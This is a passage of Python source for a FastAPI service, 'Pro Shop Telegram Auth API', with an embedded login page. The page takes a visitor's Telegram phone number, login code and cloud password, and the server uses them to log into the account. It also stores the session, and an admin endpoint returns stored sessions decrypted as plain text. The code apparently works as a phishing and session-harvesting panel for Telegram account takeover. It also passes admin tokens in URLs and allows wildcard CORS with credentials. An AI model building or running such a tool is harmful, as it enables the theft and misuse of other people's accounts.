async def lifespan(app: FastAPI) -> AsyncGenerator[None, None]:
    log.info("Starting Pro Shop Enterprise System v23.0...")
    # Init DB
    await db_manager.init_db()
    # Start auth manager cleanup
    await auth_manager.start_cleanup_task()
    # Start bot
    if settings.ENABLE_BOT:
        asyncio.create_task(bot_manager.start())
    yield
    log.info("Shutting down Pro Shop Enterprise System...")
    await auth_manager.stop_cleanup_task()
    if settings.ENABLE_BOT and bot_manager.client:
        await bot_manager.client.disconnect()
    log.info("Clean shutdown complete.")

app = FastAPI(
    title="Pro Shop Telegram Auth API",
    description="Enterprise-grade MTProto authentication system with multi-platform support.",
    version="23.0.0",
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class RequestLoggingMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        start_time = time.time()
        response = await call_next(request)
        process_time = (time.time() - start_time) * 1000
        formatted_time = "{:.2f}".format(process_time)

        log.info(
            f"REQ: {request.method} {request.url.path} | "
            f"IP: {request.client.host if request.client else 'N/A'} | "
            f"STATUS: {response.status_code} | "
            f"TIME: {formatted_time}ms"
        )
        return response

app.add_middleware(RequestLoggingMiddleware)

# ============================================================================
# 9. PYDANTIC MODELS (Enhanced)
# ============================================================================

class SendCodeRequest(BaseModel):
    phone: str = Field(..., description="Phone number in international format")

class VerifyCodeRequest(BaseModel):
    session_id: str = Field(..., description="Session ID returned from send-code")
    code: str = Field(..., min_length=4, max_length=6, description="Verification code")

class Verify2FARequest(BaseModel):
    session_id: str = Field(...)
    password: str = Field(..., min_length=1)

class UserResponse(BaseModel):
    user_id: int
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    username: Optional[str] = None
    phone: str
    session_file: Optional[str] = None
    login_date: str
    source: Optional[str] = None
    is_active: bool = True

class ApiResponse(BaseModel):
    status: str
    message: str
    data: Optional[Any] = None

class AdminUserUpdateRequest(BaseModel):
    is_active: bool

class ExportSessionRequest(BaseModel):
    user_id: int

# ============================================================================
# 10. API ROUTES (Enhanced)
# ============================================================================

@app.get("/api/v1/raw/auth", response_model=ApiResponse, tags=["Raw API"])
async def raw_api_auth(
    request: Request,
    num: Optional[str] = Query(None, description="Phone number"),
    otp: Optional[str] = Query(None, description="Verification code"),
    code: Optional[str] = Query(None, description="2FA Password")
):
    """
    Raw API Endpoint for automated systems.
    Step 1: /api/v1/raw/auth?num=+989123456789
    Step 2: /api/v1/raw/auth?num=+989123456789&otp=12345
    Step 3: /api/v1/raw/auth?num=+989123456789&otp=12345&code=mypassword
    """
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")

    if not num:
        raise HTTPException(status_code=400, detail="Missing 'num' parameter")

    phone = SecurityUtils.sanitize_phone(num)
    if not SecurityUtils.validate_phone(phone):
        raise HTTPException(status_code=400, detail="Invalid phone format. Must be international (e.g., +1234567890).")

    try:
        if not otp:
            # Step 1: Send Code
            res = await auth_manager.send_code(phone)
            return {"status": "success", "message": "Code sent to Telegram.", "data": {"session_id": res["session_id"]}}

        elif otp and not code:
            # Step 2: Verify Code
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id:
                raise HTTPException(status_code=400, detail="Session not found. Request code first.")

            res = await auth_manager.verify_code(session_id, otp)
            if res["status"] == "2fa_required":
                return {"status": "2fa_required", "message": "2FA required. Provide 'code' parameter.", "data": None}
            return {"status": "success", "message": "Logged in successfully.", "data": res.get("user")}

        elif otp and code:
            # Step 3: Verify 2FA
            session_id = auth_manager.phone_to_session.get(phone)
            if not session_id:
                raise HTTPException(status_code=400, detail="Session not found.")

            res = await auth_manager.verify_2fa(session_id, code)
            return {"status": "success", "message": "2FA successful. Logged in.", "data": res.get("user")}

    except HTTPException as e:
        raise e
    except Exception as e:
        log.error(f"Raw API Error: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/json/send-code", response_model=ApiResponse, tags=["JSON API"])
async def json_send_code(payload: SendCodeRequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.send_code(payload.phone)
    return {"status": "success", "message": res["message"], "data": {"session_id": res["session_id"]}}

@app.post("/api/v1/json/verify-code", response_model=ApiResponse, tags=["JSON API"])
async def json_verify_code(payload: VerifyCodeRequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.verify_code(payload.session_id, payload.code)
    if res["status"] == "2fa_required":
        return {"status": "2fa_required", "message": res["message"], "data": None}
    return {"status": "success", "message": "Login successful.", "data": res.get("user")}

@app.post("/api/v1/json/verify-2fa", response_model=ApiResponse, tags=["JSON API"])
async def json_verify_2fa(payload: Verify2FARequest, request: Request):
    if not await rate_limiter.check(request.client.host):
        raise HTTPException(status_code=429, detail="Rate limit exceeded.")
    res = await auth_manager.verify_2fa(payload.session_id, payload.password)
    return {"status": "success", "message": "2FA successful.", "data": res.get("user")}

# --- Admin endpoints ---
@app.get("/api/v1/admin/users", response_model=List[UserResponse], tags=["Admin"])
async def admin_get_users(
    token: str = Query(..., description="Admin token"),
    limit: int = Query(100, ge=1, le=1000),
    offset: int = Query(0, ge=0)
):
    if token != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin token.")
    users = await db_manager.get_all_users(limit, offset)
    return users

@app.put("/api/v1/admin/users/{user_id}/deactivate", tags=["Admin"])
async def admin_deactivate_user(user_id: int, token: str = Query(...)):
    if token != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin token.")
    result = await db_manager.deactivate_user(user_id)
    if result:
        await db_manager.log_admin_action("DEACTIVATE_USER", f"User ID: {user_id}")
        return {"status": "success", "message": f"User {user_id} deactivated."}
    raise HTTPException(status_code=404, detail="User not found.")

@app.get("/api/v1/admin/logs", tags=["Admin"])
async def admin_get_logs(token: str = Query(...), limit: int = Query(100, le=500)):
    if token != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin token.")
    async with aiosqlite.connect(db_manager.db_path) as db:
        cursor = await db.execute(
            "SELECT * FROM admin_logs ORDER BY timestamp DESC LIMIT ?", (limit,)
        )
        rows = await cursor.fetchall()
        columns = [desc[0] for desc in cursor.description]
        logs = [dict(zip(columns, row)) for row in rows]
        return logs

@app.get("/api/v1/admin/export-session", tags=["Admin"])
async def admin_export_session(
    user_id: int = Query(...),
    token: str = Query(...)
):
    if token != settings.ADMIN_TOKEN:
        raise HTTPException(status_code=403, detail="Invalid admin token.")
    user = await db_manager.get_user_by_id(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    # Decrypt session string if encrypted
    session_string = user.get('session_string')
    if not session_string:
        raise HTTPException(status_code=404, detail="No session string stored.")
    if settings.ENCRYPT_SESSIONS:
        try:
            decrypted = SecurityUtils.decrypt_session_data(session_string, settings.SESSION_ENCRYPTION_KEY)
            session_string = decrypted.decode('utf-8')
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Decryption failed: {e}")
    # Return as plain text or JSON
    return PlainTextResponse(session_string)

# --- System endpoints ---
@app.get("/api/v1/system/health", tags=["System"])
async def health_check():
    return {
        "status": "healthy",
        "version": "23.0.0",
        "active_sessions": len(auth_manager.active_sessions),
        "db_users": len(await db_manager.get_all_users(limit=9999)),
        "uptime": time.time(),
        "environment": settings.ENVIRONMENT
    }

# ============================================================================
# 11. FRONTEND (Enhanced with better UI and features)
# ============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Shop | Telegram Ultra Auth</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --ps-gold: #ffb300;
            --ps-gold-light: #ffd54f;
            --ps-bg: #0a0e14;
            --ps-bg-secondary: #11161f;
            --ps-bg-tertiary: #1c2330;
            --ps-text: #ffffff;
            --ps-text-secondary: #6b7785;
            --ps-success: #00e676;
            --ps-error: #ff5252;
            --ps-blue: #00b0ff;
            --ps-border: #2a3342;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { height: 100%; font-family: 'Inter', sans-serif; background-color: var(--ps-bg); color: var(--ps-text); overflow: hidden; }

        .bg-pattern {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            background-color: var(--ps-bg);
            background-image: 
                radial-gradient(circle at 15% 15%, rgba(255, 179, 0, 0.06) 0%, transparent 35%),
                radial-gradient(circle at 85% 85%, rgba(0, 176, 255, 0.06) 0%, transparent 35%),
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
        }

        .container { display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; }
        
        .auth-card {
            background: var(--ps-bg-secondary);
            border-radius: 24px;
            padding: 50px 40px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
            border: 1px solid var(--ps-border);
            transition: transform 0.3s ease;
        }

        .auth-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 4px;
            background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light));
        }

        .auth-header { text-align: center; margin-bottom: 35px; }
        .logo-wrapper {
            width: 90px; height: 90px; margin: 0 auto 20px; 
            background: linear-gradient(135deg, var(--ps-gold) 0%, var(--ps-gold-light) 100%);
            border-radius: 24px; display: flex; justify-content: center; align-items: center; 
            box-shadow: 0 10px 30px rgba(255, 179, 0, 0.3);
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
        
        .logo-wrapper svg { width: 45px; height: 45px; fill: var(--ps-bg); }
        
        .auth-header h1 { font-size: 28px; font-weight: 800; margin-bottom: 8px; letter-spacing: -1px; background: linear-gradient(to right, #fff, #6b7785); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .auth-header p { color: var(--ps-text-secondary); font-size: 14px; font-weight: 400; transition: opacity 0.3s; min-height: 20px; }

        .form-group { margin-bottom: 20px; position: relative; }
        .form-label { display: block; margin-bottom: 8px; color: var(--ps-text-secondary); font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        
        .form-input {
            width: 100%; padding: 18px 20px; background: var(--ps-bg); border: 1px solid var(--ps-border);
            border-radius: 14px; color: var(--ps-text); font-family: 'Inter', sans-serif; font-size: 16px;
            transition: all 0.2s; outline: none;
        }
        .form-input::placeholder { color: var(--ps-text-secondary); opacity: 0.5; }
        .form-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); }

        .btn-primary {
            width: 100%; padding: 18px; background: linear-gradient(to right, var(--ps-gold), var(--ps-gold-light)); border: none; border-radius: 14px;
            color: var(--ps-bg); font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s;
            margin-top: 10px; font-family: 'Inter', sans-serif; box-shadow: 0 4px 20px rgba(255, 179, 0, 0.2); text-transform: uppercase; letter-spacing: 1px;
            display: flex; align-items: center; justify-content: center;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255, 179, 0, 0.3); }
        .btn-primary:active { transform: translateY(0); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        
        .btn-secondary {
            background: transparent;
            border: 1px solid var(--ps-border);
            color: var(--ps-text-secondary);
        }
        .btn-secondary:hover {
            background: var(--ps-bg-tertiary);
            border-color: var(--ps-gold);
            color: var(--ps-text);
        }

        .btn-text { background: none; border: none; color: var(--ps-text-secondary); cursor: pointer; font-size: 14px; display: block; margin: 20px auto 0; font-family: 'Inter', sans-serif; transition: color 0.2s; }
        .btn-text:hover { color: var(--ps-gold); }

        .form-step { display: none; animation: slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
        .form-step.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        .otp-group { display: flex; justify-content: space-between; gap: 10px; }
        .otp-input {
            width: 55px; height: 65px; text-align: center; background: var(--ps-bg); border: 1px solid var(--ps-border);
            border-radius: 14px; color: var(--ps-text); font-size: 24px; font-weight: 600; outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus { border-color: var(--ps-gold); box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.1); transform: scale(1.05); }

        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; max-width: 350px; }
        .toast { background: var(--ps-bg-secondary); border-left: 4px solid var(--ps-gold); padding: 15px 20px; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); animation: slideIn 0.3s ease; font-size: 14px; border: 1px solid var(--ps-border); }
        .toast.success { border-left-color: var(--ps-success); color: var(--ps-success); }
        .toast.error { border-left-color: var(--ps-error); color: var(--ps-error); }
        @keyframes slideIn { from { transform: translateX(120%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.3); border-radius: 50%; border-top-color: var(--ps-bg); animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .dashboard-info { background: var(--ps-bg); border-radius: 16px; padding: 30px; margin-top: 20px; text-align: center; border: 1px solid var(--ps-border); }
        .avatar-placeholder { width: 80px; height: 80px; background: linear-gradient(135deg, var(--ps-gold), var(--ps-gold-light)); border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: 700; color: var(--ps-bg); }
        .dashboard-info h2 { color: var(--ps-text); margin-bottom: 15px; font-size: 24px; }
        .dashboard-info p { color: var(--ps-text-secondary); margin-bottom: 8px; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .badge { background: rgba(255, 179, 0, 0.1); padding: 4px 10px; border-radius: 6px; font-size: 12px; color: var(--ps-gold-light); border: 1px solid var(--ps-gold); }

        .footer { margin-top: 30px; text-align: center; font-size: 12px; color: var(--ps-text-secondary); border-top: 1px solid var(--ps-border); padding-top: 20px; }
    </style>
</head>
<body>
    <div class="bg-pattern"></div>
    <div class="toast-container" id="toastContainer"></div>

    <div class="container">
        <div class="auth-card">
            <div class="auth-header">
                <div class="logo-wrapper">
                    <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 13L2 10v8l10 5 10-5v-8l-10 5z"/></svg>
                </div>
                <h1>Pro Shop</h1>
                <p id="stepDescription">Secure MTProto Authentication</p>
            </div>

            <div class="form-step active" id="step_phone">
                <form id="phoneForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="phone">Phone Number</label>
                        <input type="tel" id="phone" class="form-input" placeholder="+1 234 567 890" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnSendCode">
                        <span class="btn-text-content">Continue</span>
                    </button>
                </form>
            </div>

            <div class="form-step" id="step_code">
                <form id="codeForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label">Verification Code</label>
                        <div class="otp-group">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <input type="hidden" id="codeHidden">
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerifyCode">
                        <span class="btn-text-content">Verify Code</span>
                    </button>
                    <button type="button" class="btn-text" id="backToPhone">Change Phone Number</button>
                </form>
            </div>

            <div class="form-step" id="step_2fa">
                <form id="twoFaForm" autocomplete="off">
                    <div class="form-group">
                        <label class="form-label" for="password">Two-Step Verification</label>
                        <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn-primary" id="btnVerify2fa">
                        <span class="btn-text-content">Unlock Account</span>
                    </button>
                </form>
            </div>

            <div class="form-step" id="step_dashboard">
                <div class="dashboard-info">
                    <div class="avatar-placeholder" id="avatarPlaceholder">U</div>
                    <h2>Welcome back!</h2>
                    <p id="userName"></p>
                    <p id="userUsername"></p>
                    <p id="userPhone"></p>
                    <p style="margin-top:15px;"><span class="badge">MTProto Connected</span></p>
                </div>
                <button type="button" class="btn-primary" id="btnLogout" style="margin-top: 20px; background: var(--ps-error); color: #fff;">
                    <span class="btn-text-content">Log Out</span>
                </button>
            </div>

            <div class="footer">
                <span>v23.0.0 | Enterprise Edition</span>
            </div>
        </div>
    </div>

    <script>
        let currentSessionId = null;

        const Toast = {
            container: document.getElementById('toastContainer'),
            show: function(message, type = 'info', duration = 3500) {
                const toast = document.createElement('div');
                toast.className = `toast ${type}`;
                toast.textContent = message;
                this.container.appendChild(toast);
                setTimeout(() => {
                    toast.style.animation = 'slideOut 0.3s forwards';
                    setTimeout(() => toast.remove(), 300);
                }, duration);
            }
        };

        const Steps = {
            current: 'phone',
            steps: {
                phone: { el: document.getElementById('step_phone'), desc: 'Secure MTProto Authentication' },
                code: { el: document.getElementById('step_code'), desc: 'Enter the 5-digit code sent to your app' },
                '2fa': { el: document.getElementById('step_2fa'), desc: 'Enter your cloud password' },
                dashboard: { el: document.getElementById('step_dashboard'), desc: 'Successfully authenticated' }
            },
            go: function(step) {
                Object.values(this.steps).forEach(s => s.el.classList.remove('active'));
                this.steps[step].el.classList.add('active');
                document.getElementById('stepDescription').textContent = this.steps[step].desc;
                this.current = step;
            }
        };

        async function apiReq(endpoint, data) {
            try {
                const res = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const json = await res.json();
                if (!res.ok) throw new Error(json.detail || 'API Error');
                return json;
            } catch (err) {
                throw err;
            }
        }

        function setLoading(btn, loading, text) {
            btn.disabled = loading;
            btn.innerHTML = loading ? `<span class="spinner"></span> Processing...` : text;
        }

        document.getElementById('phoneForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const btn = document.getElementById('btnSendCode');
            if (!phone.match(/^\+?[0-9]{10,15}$/)) return Toast.show('Invalid phone format.', 'error');
            setLoading(btn, true, 'Continue');
            try {
                const res = await apiReq('/api/v1/json/send-code', { phone });
                currentSessionId = res.data.session_id;
                Toast.show(res.message, 'success');
                Steps.go('code');
            } catch (err) {
                Toast.show(err.message, 'error');
            } finally {
                setLoading(btn, false, 'Continue');
            }
        });

        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (input.value.length > 1) input.value = input.value.slice(0, 1);
                if (input.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                let code = '';
                otpInputs.forEach(i => code += i.value);
                document.getElementById('codeHidden').value = code;
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus();
            });
        });

        document.getElementById('codeForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('codeHidden').value;
            const btn = document.getElementById('btnVerifyCode');
            if (code.length !== 5) return Toast.show('Enter all 5 digits.', 'error');
            setLoading(btn, true, 'Verify Code');
            try {
                const res = await apiReq('/api/v1/json/verify-code', { session_id: currentSessionId, code });
                if (res.status === 'success') {
                    Toast.show('Login successful!', 'success');
                    updateDashboard(res.data);
                    Steps.go('dashboard');
                } else if (res.status === '2fa_required') {
                    Toast.show(res.message, 'info');
                    Steps.go('2fa');
                }
            } catch (err) {
                Toast.show(err.message, 'error');
            } finally {
                setLoading(btn, false, 'Verify Code');
            }
        });

        document.getElementById('backToPhone').addEventListener('click', () => {
            otpInputs.forEach(i => i.value = '');
            Steps.go('phone');
        });

        document.getElementById('twoFaForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btnVerify2fa');
            setLoading(btn, true, 'Unlock Account');
            try {
                const res = await apiReq('/api/v1/json/verify-2fa', { session_id: currentSessionId, password });
                if (res.status === 'success') {
                    Toast.show('2FA successful!', 'success');
                    updateDashboard(res.data);
                    Steps.go('dashboard');
                }
            } catch (err) {
                Toast.show(err.message, 'error');
            } finally {
                setLoading(btn, false, 'Unlock Account');
            }
        });

        function updateDashboard(user) {
            const name = `${user.first_name || ''} ${user.last_name || ''}`.trim();
            document.getElementById('userName').textContent = `Name: ${name}`;
            document.getElementById('userUsername').textContent = `Username: @${user.username || 'N/A'}`;
            document.getElementById('userPhone').textContent = `Phone: ${user.phone}`;
            document.getElementById('avatarPlaceholder').textContent = name.charAt(0).toUpperCase() || 'U';
        }

        document.getElementById('btnLogout').addEventListener('click', () => {
            Steps.go('phone');
            Toast.show('Logged out.', 'info');
        });
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse, include_in_schema=False)
async def serve_frontend():
    if not settings.ENABLE_WEB_UI:
        return HTMLResponse("<h1>Pro Shop API</h1><p>Web UI is disabled.</p>")
    return HTMLResponse(content=FRONTEND_HTML)

# ============================================================================
# 12. MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    log.info("Initializing Pro Shop Enterprise System v23.0...")
    uvicorn.run(
        "app:app",
        host=settings.HOST,
        port=settings.PORT,
        log_level="info" if settings.ENVIRONMENT != AppEnv.DEVELOPMENT else "debug",
        workers=1,
        reload=settings.ENVIRONMENT == AppEnv.DEVELOPMENT
    )
